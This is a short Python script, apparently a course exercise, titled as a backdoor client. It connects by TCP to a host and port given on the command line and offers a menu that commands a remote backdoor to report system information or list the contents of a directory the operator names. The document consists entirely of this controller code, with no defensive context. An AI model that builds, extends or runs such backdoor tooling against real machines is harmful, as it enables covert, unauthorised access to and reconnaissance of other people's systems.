import socket, sys

if len(sys.argv) < 3:
    print("Invalid Arguments!")
    print("Syntax: python3 backdoor_client.py <ip address> <port>")
    sys.exit()

SRV_ADDR = sys.argv[1]
SRV_PORT = int(sys.argv[2])

def print_menu():
    print("-" * 50)
    print("""\n\n
    0) Close the connection
    1) Get system info
    2) List directory contents
    """)
    print("-" * 50)

my_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
my_sock.connect((SRV_ADDR, SRV_PORT))

print("Connection established")
print_menu()

while 1:
    message = input("\n-Select an option: ")

    if(message == "0"):
        my_sock.sendall(message.encode())
        my_sock.close()
        break
        
    elif(message == "1"):
        my_sock.sendall(message.encode())
        data = my_sock.recv(1024)
        if not data: break
        print(data.decode('utf-8'))
        
    elif(message == "2"):
        path = input("Insert the path: ")
        my_sock.sendall(message.encode())
        my_sock.sendall(path.encode())
        data = my_sock.recv(1024)
        data = data.decode('utf-8').split(",")
        print("*"*40)
        for x in data:
            print(x)
        print("-" * 40)
        
    print_menu()

